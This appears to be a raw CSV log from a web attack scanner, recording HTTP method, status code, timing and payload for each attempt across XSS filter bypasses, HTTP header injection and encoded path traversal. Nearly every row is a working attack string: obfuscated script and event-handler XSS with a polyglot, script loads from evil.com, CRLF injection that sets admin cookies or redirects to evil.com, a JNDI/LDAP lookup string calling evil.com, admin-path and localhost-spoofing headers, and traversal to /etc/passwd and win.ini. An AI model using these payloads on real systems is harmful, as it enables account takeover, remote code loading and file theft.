Category,Method,Status,Response Time (ms),Payload,Is Redirect,WAF Detected,WAF Type,Timestamp,URL
"XSS - Modern Bypasses","DELETE",404,2341,"&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,2370,"&#x3C;script&#x3E;alert&#x28;1&#x29;&#x3C;/script&#x3E;",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,2399,"&#x3C;script&#x3E;alert&#x28;1&#x29;&#x3C;/script&#x3E;",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,2612,"&#x3C;script&#x3E;alert&#x28;1&#x29;&#x3C;/script&#x3E;",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,27,"&#x3C;script&#x3E;alert&#x28;1&#x29;&#x3C;/script&#x3E;",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,242,"&lt;script&gt;alert(1)&lt;/script&gt;",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,450,"&lt;script&gt;alert(1)&lt;/script&gt;",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,667,"&lt;script&gt;alert(1)&lt;/script&gt;",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,694,"&lt;script&gt;alert(1)&lt;/script&gt;",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,909,"<ScRiPt>AlErT(1)</ScRiPt>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,1117,"<ScRiPt>AlErT(1)</ScRiPt>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,1331,"<ScRiPt>AlErT(1)</ScRiPt>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,1367,"<ScRiPt>AlErT(1)</ScRiPt>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,1583,"<SCRIPT>ALERT(1)</SCRIPT>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,1613,"<SCRIPT>ALERT(1)</SCRIPT>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,1647,"<SCRIPT>ALERT(1)</SCRIPT>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,1859,"<SCRIPT>ALERT(1)</SCRIPT>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,1889,"<iMg SrC=x OnErRoR=aLeRt(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,1917,"<iMg SrC=x OnErRoR=aLeRt(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,2125,"<iMg SrC=x OnErRoR=aLeRt(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,2331,"<iMg SrC=x OnErRoR=aLeRt(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,2360,"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,2386,"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,2414,"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,30,"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,246,"JAVASCRIPT:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,472,"JAVASCRIPT:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,508,"JAVASCRIPT:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,722,"JAVASCRIPT:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,933,"java\script:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,1147,"java\script:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,1353,"java\script:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,1382,"java\script:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,1413,"java script:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,1442,"java script:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,1469,"java script:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,1506,"java script:alert(1)",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",403,1722,"<script src=\\evil.com\evil.js></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,1757,"<script src=\\evil.com\evil.js></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,1809,"<script src=\\evil.com\evil.js></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",403,1844,"<script src=\\evil.com\evil.js></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",403,1878,"<script src=//evil.com/evil.js></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,1913,"<script src=//evil.com/evil.js></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,1940,"<script src=//evil.com/evil.js></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",403,213,"<script src=//evil.com/evil.js></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",403,241,"<script src=data:text/javascript,alert(1)></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,270,"<script src=data:text/javascript,alert(1)></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,486,"<script src=data:text/javascript,alert(1)></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",403,699,"<script src=data:text/javascript,alert(1)></script>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",403,725,"<iframe src=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,941,"<iframe src=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,1148,"<iframe src=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",403,1355,"<iframe src=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",403,1393,"<object data=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,1610,"<object data=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,1638,"<object data=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",403,1850,"<object data=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",403,1878,"<embed src=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,1888,"<embed src=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,2060,"<svg/onload=alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,2063,"<embed src=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",403,2068,"<embed src=javascript:alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,2097,"<svg/onload=alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,2126,"<svg/onload=alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,29,"<svg/onload=alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",403,56,"<math href=javascript:alert(1)>CLICK",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,276,"<math href=javascript:alert(1)>CLICK",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,489,"<math href=javascript:alert(1)>CLICK",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",403,518,"<math href=javascript:alert(1)>CLICK",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,730,"<marquee onstart=alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,758,"<marquee onstart=alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,972,"<marquee onstart=alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,1001,"<marquee onstart=alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,1030,"<details open ontoggle=alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,1062,"<details open ontoggle=alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,1272,"<details open ontoggle=alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,1303,"<details open ontoggle=alert(1)>",false,false,"Unknown","",""
"XSS - Modern Bypasses","GET",200,1336,"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>",false,false,"Unknown","",""
"XSS - Modern Bypasses","POST",404,1543,"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>",false,false,"Unknown","",""
"XSS - Modern Bypasses","PUT",404,1586,"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>",false,false,"Unknown","",""
"XSS - Modern Bypasses","DELETE",404,1793,"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,1823,"X-Custom: test\r\nSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,2037,"X-Custom: test\r\nSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,2246,"X-Custom: test\r\nSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,28,"X-Custom: test\r\nSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,58,"X-Custom: test%0d%0aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,88,"X-Custom: test%0d%0aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,116,"X-Custom: test%0d%0aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,145,"X-Custom: test%0d%0aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,366,"X-Custom: test%0D%0ALocation: http://evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,579,"X-Custom: test%0D%0ALocation: http://evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,606,"X-Custom: test%0D%0ALocation: http://evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,636,"X-Custom: test%0D%0ALocation: http://evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,668,"X-Custom: test%250d%250aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,892,"X-Custom: test%250d%250aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,1107,"X-Custom: test%250d%250aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,1317,"X-Custom: test%250d%250aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,1530,"X-Custom: test\u000d\u000aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,1561,"X-Custom: test\u000d\u000aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,1779,"X-Custom: test\u000d\u000aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,1988,"X-Custom: test\u000d\u000aSet-Cookie: admin=true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,2204,"Cookie: $Version=1; admin=""true""; $Path=""/""; $Domain=target.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,2233,"Cookie: $Version=1; admin=""true""; $Path=""/""; $Domain=target.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,2261,"Cookie: $Version=1; admin=""true""; $Path=""/""; $Domain=target.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,33,"Cookie: $Version=1; admin=""true""; $Path=""/""; $Domain=target.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,64,"Cookie: $Version=1; session=""\u0061\u0064\u006d\u0069\u006e""; $Path=""/""",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,273,"Cookie: $Version=1; session=""\u0061\u0064\u006d\u0069\u006e""; $Path=""/""",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,300,"Cookie: $Version=1; session=""\u0061\u0064\u006d\u0069\u006e""; $Path=""/""",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,507,"Cookie: $Version=1; session=""\u0061\u0064\u006d\u0069\u006e""; $Path=""/""",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,716,"Host: target.com\r\nX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,926,"Host: target.com\r\nX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,1139,"Host: target.com\r\nX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,1356,"Host: target.com\r\nX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,1580,"Host: target.com%0d%0aX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,1607,"Host: target.com%0d%0aX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,1814,"Host: target.com%0d%0aX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,2030,"Host: target.com%0d%0aX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,2245,"Host: target.com\u000d\u000aX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,2279,"Host: target.com\u000d\u000aX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,2308,"Host: target.com\u000d\u000aX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,2521,"Host: target.com\u000d\u000aX-Forwarded-Host: evil.com",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,2551,"User-Agent: Mozilla/5.0\r\nX-Injected: true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,2583,"User-Agent: Mozilla/5.0\r\nX-Injected: true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,2791,"User-Agent: Mozilla/5.0\r\nX-Injected: true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,206,"User-Agent: Mozilla/5.0\r\nX-Injected: true",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",403,212,"User-Agent: ${jndi:ldap://evil.com/a}",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",403,217,"User-Agent: ${jndi:ldap://evil.com/a}",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",403,224,"User-Agent: ${jndi:ldap://evil.com/a}",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",403,230,"User-Agent: ${jndi:ldap://evil.com/a}",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,446,"User-Agent: {{7*7}}",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,479,"User-Agent: {{7*7}}",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,509,"User-Agent: {{7*7}}",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,725,"User-Agent: {{7*7}}",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,935,"User-Agent: \u003cscript\u003ealert(1)\u003c/script\u003e",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,1144,"User-Agent: \u003cscript\u003ealert(1)\u003c/script\u003e",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,1353,"User-Agent: \u003cscript\u003ealert(1)\u003c/script\u003e",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,1559,"User-Agent: \u003cscript\u003ealert(1)\u003c/script\u003e",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,1775,"X-Original-URL: /admin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,1806,"X-Original-URL: /admin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,1835,"X-Original-URL: /admin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,1864,"X-Original-URL: /admin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,2078,"X-Original-URL: /admin/users",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,2292,"X-Original-URL: /admin/users",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,2510,"X-Original-URL: /admin/users",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,30,"X-Original-URL: /admin/users",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,250,"X-Original-URL: \u002fadmin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,286,"X-Original-URL: \u002fadmin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,509,"X-Original-URL: \u002fadmin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,719,"X-Original-URL: \u002fadmin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,928,"X-Original-URL: %2fadmin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,1144,"X-Original-URL: %2fadmin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,1351,"X-Original-URL: %2fadmin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,1560,"X-Original-URL: %2fadmin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,1589,"X-Rewrite-URL: /admin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,1796,"X-Rewrite-URL: /admin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,2003,"X-Rewrite-URL: /admin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,2036,"X-Rewrite-URL: /admin",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,2251,"X-Rewrite-URL: /admin\x00",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,2280,"X-Rewrite-URL: /admin\x00",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,2309,"X-Rewrite-URL: /admin\x00",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,2339,"X-Rewrite-URL: /admin\x00",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,2373,"X-HTTP-Method-Override: PUT",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,2580,"X-HTTP-Method-Override: PUT",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,2612,"X-HTTP-Method-Override: PUT",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,220,"X-HTTP-Method-Override: PUT",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,259,"X-HTTP-Method-Override: DELETE",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,476,"X-HTTP-Method-Override: DELETE",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,515,"X-HTTP-Method-Override: DELETE",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,727,"X-HTTP-Method-Override: DELETE",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,766,"X-Method-Override: PATCH",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,794,"X-Method-Override: PATCH",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,1013,"X-Method-Override: PATCH",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,1046,"X-Method-Override: PATCH",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,1076,"X-HTTP-Method: TRACE",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,1285,"X-HTTP-Method: TRACE",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,1327,"X-HTTP-Method: TRACE",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,1549,"X-HTTP-Method: TRACE",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,1759,"X-Forwarded-For: 127.0.0.1",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,1791,"X-Forwarded-For: 127.0.0.1",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,1821,"X-Forwarded-For: 127.0.0.1",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,1864,"X-Forwarded-For: 127.0.0.1",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,1895,"X-Real-IP: \u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,2111,"X-Real-IP: \u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,2332,"X-Real-IP: \u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",ERR,0,"X-Client-IP: %31%32%37%2e%30%2e%30%2e%31",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",ERR,0,"X-Remote-IP: 0177.0.0.1",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",ERR,0,"X-Remote-IP: 0177.0.0.1",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",ERR,0,"X-Remote-IP: 0177.0.0.1",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",ERR,0,"X-Remote-IP: 0177.0.0.1",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",ERR,0,"X-Forwarded-For: 2130706433",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",ERR,0,"X-Forwarded-For: 2130706433",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",ERR,0,"X-Forwarded-For: 2130706433",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",ERR,0,"X-Forwarded-For: 2130706433",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",ERR,0,"%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","POST",ERR,0,"%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","PUT",ERR,0,"%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","DELETE",ERR,0,"%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",ERR,0,"%252e%252e\%252e%252e\%252e%252e\windows\win.ini",false,false,"Unknown","",""
"Path Traversal - Encoded","POST",ERR,0,"%252e%252e\%252e%252e\%252e%252e\windows\win.ini",false,false,"Unknown","",""
"Path Traversal - Encoded","PUT",ERR,0,"%252e%252e\%252e%252e\%252e%252e\windows\win.ini",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","DELETE",404,30,"X-Real-IP: \u0031\u0032\u0037\u002e\u0030\u002e\u0030\u002e\u0031",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","GET",200,60,"X-Client-IP: %31%32%37%2e%30%2e%30%2e%31",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","POST",404,89,"X-Client-IP: %31%32%37%2e%30%2e%30%2e%31",false,false,"Unknown","",""
"HTTP Header Injection - Advanced","PUT",404,118,"X-Client-IP: %31%32%37%2e%30%2e%30%2e%31",false,false,"Unknown","",""
"Path Traversal - Encoded","DELETE",ERR,0,"%252e%252e\%252e%252e\%252e%252e\windows\win.ini",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",ERR,0,"\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","POST",ERR,0,"\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","PUT",ERR,0,"\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","DELETE",ERR,0,"\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",ERR,0,"..\u002f..\u002f..\u002fetc\u002fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","POST",ERR,0,"..\u002f..\u002f..\u002fetc\u002fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","PUT",ERR,0,"..\u002f..\u002f..\u002fetc\u002fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","DELETE",ERR,0,"..\u002f..\u002f..\u002fetc\u002fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",ERR,0,"%2e%2e%2f..%2fetc%2fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","POST",ERR,0,"%2e%2e%2f..%2fetc%2fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","PUT",ERR,0,"%2e%2e%2f..%2fetc%2fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","DELETE",ERR,0,"%2e%2e%2f..%2fetc%2fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",ERR,0,"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","POST",ERR,0,"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","PUT",ERR,0,"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","DELETE",ERR,0,"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","GET",ERR,0,"%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","POST",ERR,0,"%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",false,false,"Unknown","",""
"Path Traversal - Encoded","PUT",ERR,0,"%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",false,false,"Unknown","",""
